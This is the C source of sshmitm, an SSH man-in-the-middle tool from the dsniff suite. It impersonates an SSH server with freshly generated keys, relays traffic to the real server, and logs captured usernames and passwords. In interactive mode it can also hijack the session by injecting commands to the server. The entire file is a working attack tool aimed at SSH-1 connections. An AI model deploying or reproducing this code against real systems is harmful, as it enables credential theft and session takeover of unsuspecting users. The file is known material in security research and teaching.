/*
 * sshmitm.c
 *
 * SSH monkey-in-the-middle.
 *
 * Copyright (c) 2000 Dug Song <dugsong@monkey.org>
 *
 * $Id: sshmitm.c,v 1.7 2001/03/15 08:33:04 dugsong Exp $
 */

#include "config.h"

#include <sys/param.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/nameser.h>
#include <openssl/ssl.h>
#include <libnet.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strlcat.h>

#include "buf.h"
#include "record.h"
#include "sshcrypto.h"
#include "ssh.h"
#include "version.h"

int	 Opt_debug = 0;
int	 Opt_interact = 0;
u_short	 Opt_dns = 0;
int	 Opt_read = 0;
int	 Opt_write = 0;

int	 mitm_fd;
int	 client_fd, server_fd;
SSH_CTX	*ssh_client_ctx, *ssh_server_ctx;
SSH	*ssh_client, *ssh_server;
struct	 sockaddr_in csin, ssin;
int	 sig_pipe[2];

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: sshmitm [-d] [-I] [-p port] host [port]\n");
	exit(1);
}

static void
ssh_strlcat(char *dst, int size, char *src, int len)
{
	char *p;
	u_int32_t i;

	for (p = dst; *p != '\0'; p++)
		;
	size -= (p - dst - 1);
	
	GETLONG(i, src);
	i = MIN(i, len);
	i = MIN(i, size);
	
	memcpy(p, src, i);
	p[i] = '\0';
}

static void
sig_chld(int signal)
{
	if (write(sig_pipe[1], "x", 1) == -1)
		warn("sig_chld");
	
}

static void
sig_int(int signal)
{
	close(mitm_fd);
	record_close();
	exit(0);
}

static void
reap_child(void)
{
	pid_t pid, status;
	
	while ((pid = waitpid(-1, &status, WNOHANG)) > 0) {
		if (Opt_debug)
			warnx("child %d terminated with status %d",
			      pid, status);
	}
}

static void
mitm_init(u_short lport, u_long ip, u_short rport)
{
	int i = 1;

	if (pipe(sig_pipe) == -1)
		err(1, "pipe");
	
	if ((mitm_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		err(1, "socket");
	
	if (setsockopt(mitm_fd, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i)) == -1)
		err(1, "setsockopt");
	
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_addr.s_addr = INADDR_ANY;
	ssin.sin_port = htons(lport);
	
	if (bind(mitm_fd, (struct sockaddr *)&ssin, sizeof(ssin)) == -1)
		err(1, "bind");
	
	if (listen(mitm_fd, 3) == -1)
		err(1, "listen");
	
	ssin.sin_addr.s_addr = ip;
	ssin.sin_port = htons(rport);
	
	SSH_init();
	
	ssh_client_ctx = SSH_CTX_new();
	ssh_client_ctx->hostkey = RSA_generate_key(1024, 35, NULL, NULL);
	ssh_client_ctx->servkey = RSA_generate_key(768, 35, NULL, NULL);

	if (ssh_client_ctx->hostkey == NULL ||
	    ssh_client_ctx->servkey == NULL) {
		errx(1, "RSA key generation failed");
	}
}

static void
mitm_child(void)
{
	u_char buf[SSH_MAX_PKTLEN];
	char userpass[1024];
	fd_set fds;
	int i, pass_done, hijack_done;
	
	if (Opt_debug)
		warnx("new connection from %s.%d",
		      inet_ntoa(csin.sin_addr), ntohs(csin.sin_port));
	
	if (fcntl(client_fd, F_SETFL, 0) == -1)
		err(1, "fcntl");

	/* Connect to real server. */
	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		err(1, "socket");
	
	if (connect(server_fd, (struct sockaddr *)&ssin, sizeof(ssin)) == -1)
		err(1, "connect");

	/* Relay version strings. */
	if ((i = read(server_fd, buf, sizeof(buf))) <= 0 || buf[i - 1] != '\n')
		errx(1, "bad version string from server");

	if (write(client_fd, buf, i) != i)
		err(1, "write");
	
	if ((i = read(client_fd, buf, sizeof(buf))) <= 0 || buf[i - 1] != '\n')
		errx(1, "bad version string from client");

	if (write(server_fd, buf, i) != i)
		err(1, "write");
	
	/* Perform server key exchange. */	
	if ((ssh_server_ctx = SSH_CTX_new()) == NULL ||
	    (ssh_server = SSH_new(ssh_server_ctx)) == NULL)
		err(1, "malloc");
	
	SSH_set_fd(ssh_server, server_fd);
	
	if (SSH_connect(ssh_server) == -1)
		errx(1, "server key exchange failed");
	
	/* Perform client key exchange. */
	if ((ssh_client = SSH_new(ssh_client_ctx)) == NULL)
		err(1, "malloc");
	
	SSH_set_fd(ssh_client, client_fd);
	
	if (SSH_accept(ssh_client) == -1)
		errx(1, "client key exchange failed");

	/* Relay username. */
	if ((i = SSH_recv(ssh_client, buf, sizeof(buf))) <= 0 ||
	    buf[0] != SSH_CMSG_USER)
		errx(1, "couldn't get username");

	userpass[0] = '\0';
	ssh_strlcat(userpass, sizeof(userpass), buf + 1, i - 1);
	strlcat(userpass, "\n", sizeof(userpass));
	
	if (SSH_send(ssh_server, buf, i) != i)
		errx(1, "couldn't relay username");
	
	pass_done = hijack_done = 0;
	
	/* Relay packets. */
	for (;;) {
		FD_ZERO(&fds);
		FD_SET(server_fd, &fds);
		i = server_fd;
		
		if (Opt_interact) {
			FD_SET(STDIN_FILENO, &fds);
		}		
		if (!hijack_done) {
			FD_SET(client_fd, &fds);
			i = MAX(client_fd, i);
		}
		if (select(i + 1, &fds, 0, 0, 0) == -1) {
			if (errno != EINTR)
				break;
		}
		if (FD_ISSET(client_fd, &fds)) {
			i = sizeof(buf);
			if ((i = SSH_recv(ssh_client, buf, i)) <= 0)
				break;

			if (!pass_done) {
				if (buf[0] == SSH_CMSG_AUTH_PASSWORD) {
					ssh_strlcat(userpass, sizeof(userpass),
						    buf + 1, i - 1);
					strlcat(userpass, "\n",
						sizeof(userpass));
				}
				else {
					pass_done = 1;
					record(csin.sin_addr.s_addr,
					       ssin.sin_addr.s_addr,
					       IPPROTO_TCP,
					       ntohs(csin.sin_port),
					       ntohs(ssin.sin_port), "ssh",
					       userpass, strlen(userpass));
				}
			}			    
			if (SSH_send(ssh_server, buf, i) != i)
				break;
		}
		else if (FD_ISSET(server_fd, &fds)) {
			i = sizeof(buf);
			if ((i = SSH_recv(ssh_server, buf, i)) <= 0)
				break;

			if (Opt_interact) {
				if (buf[0] == SSH_SMSG_STDOUT_DATA &&
				    write(STDOUT_FILENO, buf + 5, i - 5) <= 0) {
					break;
				}
				else if (buf[0] == SSH_SMSG_STDERR_DATA &&
					 write(STDOUT_FILENO, buf + 5, i - 5) <= 0) {
					break;
				}
				else if (buf[0] == SSH_SMSG_EXITSTATUS ||
					 buf[0] == SSH_MSG_DISCONNECT) {
					warnx("connection closed");
					break;
				}
			}
			if (!hijack_done) {
				if (SSH_send(ssh_client, buf, i) != i)
					break;
			}
		}
		else if (FD_ISSET(STDIN_FILENO, &fds)) {
			i = sizeof(buf) - 1;
			if ((i = read(STDIN_FILENO, buf + 5, i - 5)) <= 0)
				break;
			
			*(u_int32_t *)(buf + 1) = htonl(i);
			buf[0] = SSH_CMSG_STDIN_DATA;
			i += 5;
			
			if (SSH_send(ssh_server, buf, i) != i)
				break;

			/* Let the real client hang on connection hijack. */
			if (!hijack_done) {
				fprintf(stderr, "[connection hijacked]\n");
				hijack_done = 1;
			}
		}
		else err(1, "select");
	}
	SSH_close(ssh_server);
	SSH_close(ssh_client);
}

static void
mitm_run(void)
{
	u_char buf[8192];
	fd_set fds;
	int i;

	signal(SIGCHLD, sig_chld);
	signal(SIGINT, sig_int);

	if (fcntl(sig_pipe[0], F_SETFL, O_NONBLOCK) == -1 ||
	    fcntl(sig_pipe[1], F_SETFL, O_NONBLOCK) == -1)
		err(1, "fcntl");
	
	if (fcntl(mitm_fd, F_SETFL, O_NONBLOCK) == -1)
		err(1, "fcntl");
	
	for (;;) {
		FD_ZERO(&fds);
		
		FD_SET(mitm_fd, &fds);
		FD_SET(sig_pipe[0], &fds);

		i = MAX(mitm_fd, sig_pipe[0]);
		
		if (select(i + 1, &fds, 0, 0, 0) == -1) {
			if (errno != EINTR)
				err(1, "select");
		}
		i = sizeof(csin);
		
		if (FD_ISSET(sig_pipe[0], &fds)) {
			while (read(sig_pipe[0], buf, 1) == 1)
				; /* empty non-blocking pipe */

			reap_child();
		}
		if (FD_ISSET(mitm_fd, &fds)) {
			client_fd = accept(mitm_fd,
					   (struct sockaddr *)&csin, &i);

			if (client_fd >= 0) {
				if (fork() == 0) {
					close(mitm_fd);
					
					mitm_child();
					
					exit(0);
				}
				close(client_fd);
			}
			else if (errno != EINTR && errno != EWOULDBLOCK) {
				err(1, "accept");
			}
		}
	}
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	u_long ip;
	u_short lport, rport;
	int c;

	lport = rport = 22;

	while ((c = getopt(argc, argv, "dIp:h?V")) != -1) {
		switch (c) {
		case 'd':
			Opt_debug = 1;
			break;
		case 'I':
			Opt_interact = 1;
			break;
		case 'p':
			if ((lport = atoi(optarg)) == 0)
				usage();
			break;
		default:
			usage();
			break;
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc < 1)
		usage();
	
	if ((ip = libnet_name2addr4(NULL, argv[0], LIBNET_RESOLVE)) == -1)
		usage();

	if (argc == 2 && (rport = atoi(argv[1])) == 0)
		usage();
	
	record_init(NULL);
	
	mitm_init(lport, ip, rport);

	warnx("relaying to %s", argv[0]);
	
	mitm_run();

	exit(0);
}
